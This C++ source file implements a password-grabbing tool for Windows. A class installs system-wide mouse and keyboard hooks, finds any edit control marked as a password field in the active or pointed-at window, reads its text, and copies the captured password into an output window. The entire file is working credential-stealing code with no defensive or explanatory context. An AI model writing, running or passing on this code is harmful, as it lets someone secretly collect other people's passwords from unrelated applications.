// GetPassHook.cpp: implementation of the CGetPassHook class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "GetPassHook.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

#pragma data_seg("ShareData")
HHOOK hKeyBoardHook=NULL;		//keyboard hook
HHOOK hMouseHook=NULL;			//mouse hook
HINSTANCE glhInstance=NULL;		//globle instance
HWND hOutPutWnd=NULL;			//Display Pass Wnd
#pragma data_seg()

BOOL WINAPI EnumWndProc(HWND hwnd,LPARAM lParam);
LRESULT WINAPI MouseHookProc(int nCode,WPARAM wParam ,LPARAM lParam);
LRESULT WINAPI KeyBoardProc(int nCode,WPARAM wParam,LPARAM lParam);

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CGetPassHook::CGetPassHook()
{
}

CGetPassHook::~CGetPassHook()
{
	StopHook();
}

BOOL CGetPassHook::StartHook(HWND hwnd)
{			//install hoook
	hMouseHook=SetWindowsHookEx(WH_MOUSE,MouseHookProc,glhInstance,0);
			//mouse hook
	hKeyBoardHook=SetWindowsHookEx(WH_KEYBOARD,KeyBoardProc,glhInstance,0);
			//keyboard hook
	if(hMouseHook&&hKeyBoardHook)
	{
		hOutPutWnd=hwnd;
		return TRUE;
	}
	return FALSE;
}

BOOL CGetPassHook::StopHook()
{			//unstall hook
	BOOL mHook=UnhookWindowsHookEx(hMouseHook);
	BOOL kHook=UnhookWindowsHookEx(hKeyBoardHook);
	if(mHook&&kHook)
		return TRUE;
	return FALSE;
}

BOOL WINAPI EnumWndProc(HWND hwnd,LPARAM lParam)
{		//enum the child window,find passedit
	if(hwnd)
	{
		LONG style=::GetWindowLong(hwnd,GWL_STYLE);
		if(style&ES_PASSWORD)
		{
			char szPass[255];
			::SendMessage(hwnd,WM_GETTEXT,255,(LPARAM)szPass);
			::SendMessage(hOutPutWnd,WM_SETTEXT,0,(LPARAM)szPass);
			return TRUE;
		}
	}

	return TRUE;
}

LRESULT WINAPI MouseHookProc(int nCode,WPARAM wParam ,LPARAM lParam)
{		//mouse hook procedure
	LPMOUSEHOOKSTRUCT lpMouse=(MOUSEHOOKSTRUCT FAR*)lParam;
	if(nCode>=0)
	{
		HWND hTargetHwnd=lpMouse->hwnd;
		if(hTargetHwnd)
		{
			LONG style=::GetWindowLong(hTargetHwnd,GWL_STYLE);
			if(style&ES_PASSWORD)		//is password edit?
			{
				char szPass[255];
				::SendMessage(hTargetHwnd,WM_GETTEXT,255,(LPARAM)szPass);
						//get password
				::SendMessage(hOutPutWnd,WM_SETTEXT,0,(LPARAM)szPass);
						//output password
			}
		}
	}
	
	return CallNextHookEx(hMouseHook,nCode,wParam,lParam);
}

LRESULT WINAPI KeyBoardProc(int nCode,WPARAM wParam,LPARAM lParam)
{		//keyboard hook proc

	if(nCode>=0)
	{
		HWND hTargetHwnd=GetActiveWindow();		//get active window
		if(hTargetHwnd)
			EnumChildWindows(hTargetHwnd,EnumWndProc,0);	//enum child window
	}

	return CallNextHookEx(hKeyBoardHook,nCode,wParam,lParam);
}